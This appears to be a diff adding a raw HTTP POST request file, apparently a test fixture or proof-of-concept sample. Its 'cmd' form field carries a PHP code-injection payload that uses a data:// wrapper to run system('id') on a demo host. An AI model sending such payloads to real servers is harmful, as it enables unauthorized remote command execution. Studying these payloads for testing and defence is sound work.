@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Connection: close
+
+cmd=f=data://text/plain,&#x3C;?php system(&#x27;id&#x27;);?&#x3E;
